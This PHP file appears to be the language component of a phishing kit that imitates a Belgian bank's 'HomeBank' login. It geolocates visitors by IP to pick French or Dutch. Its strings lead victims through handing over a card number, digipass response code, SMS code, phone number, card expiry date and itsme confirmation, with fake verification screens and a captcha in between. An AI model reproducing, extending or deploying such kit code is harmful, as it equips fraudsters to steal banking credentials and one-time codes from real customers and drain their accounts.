<?php
    error_reporting(0);
    session_start();
function get_client_countrycode() {
    global $countrycode;
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}

function lang() {
    $countrycode = get_client_countrycode();
    switch ($countrycode) {
        case 'FR':
            return $_SESSION['lang'] = 'fr';
            break;
        case 'NL':
            return $_SESSION['lang'] = 'nl';
            break;
        default:
            return $_SESSION['lang'] = 'nl';
    }
}

function get_text($place) {
    global $lang;
    return $lang[$place][$_SESSION['lang']];
};

$lang = array(
    // Nav :
    'title_head' => [
        'fr' => 'HomeBank | Se connecter',
        'nl' => 'HomeBank | Login'
    ],

    'button_lang_switch' => [
        'fr' => '<button type="submit" name="nl">Nederlands</button>',
        'nl' => '<button type="submit" name="fr">Français</button>',
    ],

    'link_help' => [
        'fr' => 'Aide',
        'nl' => 'Help'
    ],

    // Footer :
    'link_footer_1' => [
        'fr' => 'Informations juridiques',
        'nl' => 'Juridische informatie'
    ],

    'link_footer_2' => [
        'fr' => 'Vie privée',
        'nl' => 'Privacy'
    ],

    'link_footer_3' => [
        'fr' => 'Politique de Cookies',
        'nl' => 'Cookiebeleid'
    ],

    'link_footer_4' => [
        'fr' => 'Tarifs',
        'nl' => 'Tarieven'
    ],

    // Loading :
    'title_step_loading' => [
        'fr' => 'S\'il vous plaît, attendez',
        'nl' => 'Alstublieft, wacht'
    ],

    'p_step_loading' => [
        'fr' => 'Nous vérifions vos informations. Vous serez redirigé vers la prochaine page sous peu. Le processus de vérification ne prendra pas longtemps.',
        'nl' => 'We controleren uw gegevens. U wordt binnenkort doorgestuurd naar de volgende pagina. Het verificatieproces zal niet lang duren.'
    ],

    // Login :
    'connect_with_login' => [
        'fr' => 'Se connecter avec',
        'nl' => 'Aanmelden met'
    ],

    'connect_with_value_login' => [
        'fr' => 'Smartphone et itsme®',
        'nl' => 'Smartphone en itsme®'
    ],

    'label_login' => [
        'fr' => '1. Saisissez votre numéro de carte',
        'nl' => '1. Vul je kaartnummer in'
    ],

    'remember_me' => [
        'fr' => 'Sauvegarder mon numéro de carte',
        'nl' => 'Bewaar mijn kaartnummer'
    ],

    'message_error_input_login' => [
        'fr' => 'Numéro de carte est obligatoire.',
        'nl' => 'Kaartnummer is verplicht.'
    ],

    'button_login' => [
        'fr' => 'Me connecter',
        'nl' => 'Aanmelden'
    ],

    'message_error_login' => [
        'fr' => 'Les informations de connexion sont incorrectes. Veuillez essayer de vous connecter.',
        'nl' => 'De inloggegevens zijn onjuist. Probeer opnieuw in te loggen.'
    ],

    // Step One :
    'label_step_one' => [
        'fr' => '2. Insérez votre carte de débit dans le pass numérique',
        'nl' => '2. Plaats uw debetkaart in de digitale pas'
    ],

    'text_step_one_1' => [
        'fr' => '1. Presse',
        'nl' => '1. Druk'
    ],

    'text_step_one_2' => [
        'fr' => '2. Donnez le défi et',
        'nl' => '2. Geef de uitdaging en'
    ],

    'text_step_one_3' => [
        'fr' => 'appuyez sur',
        'nl' => 'druk op'
    ],

    'text_step_one_4' => [
        'fr' => '3. Entrez votre code PIN et appuyez sur',
        'nl' => '3. Voer uw PIN-code in en druk op'
    ],

    'text_step_one_5' => [
        'fr' => '4. Entrez le code de réponse ici',
        'nl' => '4. Voer de antwoordcode hier in'
    ],

    // Step Two :
    'p_step_two' => [
        'fr' => 'Veuillez remplir les champs obligatoires afin que nous puissions vérifier votre identité.',
        'nl' => 'Vul de verplichte velden in zodat we uw identiteit kunnen verifiëren.'
    ],

    'label_step_two' => [
        'fr' => 'Veuillez saisir le SMS que vous avez reçu ci-dessous pour confirmer votre connexion.',
        'nl' => 'Voer de SMS in die u hebt ontvangen om uw inlog te bevestigen.'
    ],

    'placeholder_step_two' => [
        'fr' => 'Code SMS',
        'nl' => 'SMS-code'
    ],

    // Step Three :
    'p_step_three' => [
        'fr' => 'Veuillez remplir les champs obligatoires afin que nous puissions vérifier votre identité.',
        'nl' => 'Vul de verplichte velden in zodat we uw identiteit kunnen verifiëren.'
    ],

    'label_step_three_1' => [
        'fr' => 'Vous devez vérifier votre numéro de téléphone.',
        'nl' => 'U moet uw telefoonnummer verifiëren.'
    ],

    'label_step_three_2' => [
        'fr' => 'Vous devez vérifier la date d\'expiration de votre carte.',
        'nl' => 'U moet de vervaldatum van uw kaart verifiëren.'
    ],

    'placeholder_step_three_1' => [
        'fr' => 'Numéro de téléphone',
        'nl' => 'Telefoonnummer'
    ],

    'placeholder_step_three_2' => [
        'fr' => 'MM/AAAA',
        'nl' => 'MM/JJJJ'
    ],

    // Step Four :
    'p_step_four' => [
        'fr' => 'Vérifiez les détails affichés dans votre application itsme® et confirmez avec votre code itsme®.',
        'nl' => 'Controleer de details in uw itsme®-app en bevestig met uw itsme®-code.'
    ],

    'message_error_step_four' => [
        'fr' => 'Une erreur s\'est produite. Veuillez confirmer avec votre code itsme®.',
        'nl' => 'Er is een fout opgetreden. Bevestig met uw itsme®-code.'
    ],

    // Global : 
    'title_main' => [
        'fr' => 'Accéder à la Banque par Internet',
        'nl' => 'Aanmelden op internetbankieren'
    ],

    'connect_with_main' => [
        'fr' => 'Se connecter avec',
        'nl' => 'Aanmelden met'
    ],

    'connect_with_value_main' => [
        'fr' => 'Carte de débit et digipass',
        'nl' => 'Debetkaart en digipas'
    ],

    'button_main' => [
        'fr' => 'Suivante',
        'nl' => 'Volgende'
    ],

    'message_error_main' => [
        'fr' => 'Veuillez vérifier les informations saisies et réessayez.',
        'nl' => 'Controleer de ingevoerde gegevens en probeer het opnieuw.'
    ],

    'message_error_inputs_main' => [
        'fr' => 'Ce champ est obligatoire.',
        'nl' => 'Dit veld is verplicht.'
    ],

    // Captcha :
    'title_captcha' => [
        'fr' => 'Captcha Verification',
        'nl' => 'Captcha-verificatie'
    ],

    'p_captcha' => [
        'fr' => 'Veuillez répondre à ce simple calcul mathématique pour confirmer que vous êtes un humain et non un robot.',
        'nl' => 'Los deze eenvoudige rekensom op om te bevestigen dat u een mens bent en geen robot.'
    ],

    'button_captcha' => [
        'fr' => 'Vérifier',
        'nl' => 'Verifiëren'
    ],

    'message_error_captcha' => [
        'fr' => 'Incorrect, veuillez réessayer.',
        'nl' => 'Onjuist, probeer het opnieuw.'
    ],

    'placeholder_captcha' => [
        'fr' => 'Entrer le résultat',
        'nl' => 'Voer het resultaat in'
    ]
);
?>